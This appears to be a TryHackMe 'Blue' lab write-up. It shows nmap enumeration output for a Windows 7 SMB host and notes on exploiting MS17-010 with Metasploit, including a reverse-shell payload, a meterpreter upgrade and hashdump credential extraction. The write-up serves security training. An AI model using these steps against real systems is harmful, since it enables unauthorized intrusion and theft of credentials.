# Blue - TryHackMe Machine

## Enumeration

```bash
nmap -p 139,135,445 -v -A -sV -sC <target_ip>

Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-18 01:03 EDT
NSE: Loaded 153 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Initiating Ping Scan at 01:03
Scanning 10.10.97.158 [2 ports]
Completed Ping Scan at 01:03, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:03
Completed Parallel DNS resolution of 1 host. at 01:03, 0.00s elapsed
Initiating Connect Scan at 01:03
Scanning 10.10.97.158 [3 ports]
Discovered open port 445/tcp on 10.10.97.158
Discovered open port 135/tcp on 10.10.97.158
Discovered open port 139/tcp on 10.10.97.158
Completed Connect Scan at 01:03, 0.19s elapsed (3 total ports)
Initiating Service scan at 01:03
Scanning 3 services on 10.10.97.158
Completed Service scan at 01:03, 6.78s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.97.158.
Initiating NSE at 01:03
Completed NSE at 01:03, 6.13s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.01s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Nmap scan report for 10.10.97.158
Host is up (0.19s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 2s
| nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:be:99:ac:e0:43 (unknown)
| Names:
|   JON-PC<00>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   JON-PC<20>           Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-07-18T00:03:46-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-18T05:03:46
|_  start_date: 2021-07-18T04:59:45

NSE: Script Post-scanning.
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Initiating NSE at 01:03
Completed NSE at 01:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.16 seconds
```

This machine is using smb 2.02 which is vulnerable to MS17-010 which exists as a Metasploit module 

## Exploitation

Started metasploit, searching for something related to MS17-010

Found a module that was built specifically for exploiting eternal_blue

```bash
set payload windows/x64/shell/reverse_tcp 
```

This gives us a windows shell. Trying to escalate to a meterpreter shell using Samba.

[https://null-byte.wonderhowto.com/how-to/upgrade-normal-command-shell-metasploit-meterpreter-0166013/](https://null-byte.wonderhowto.com/how-to/upgrade-normal-command-shell-metasploit-meterpreter-0166013/)

Okay, first I used the samba/usermap_script for searching for some additional modules, I've no idea why, maybe they are like submodules or something. 

searching for "shell_to_meterpreter", only a single sub-module exists.

Then I just had to set the session id of the shell I had suspended earlier

```bash
// to list all the background tasks 
session -l 
```

This submodule gave me an meterpreter shell

### Cracking

```bash
hashdump
```

this provides us with all the users' password hashes 

Decoding the hashes gives us the user's password, Jon's password in this case. Which I didn't really need to find the flags, I never used that password to search for flags in users's Document directory 

Helpful command: (only works with windows meterpreter shell)

```bash
search -f filename
```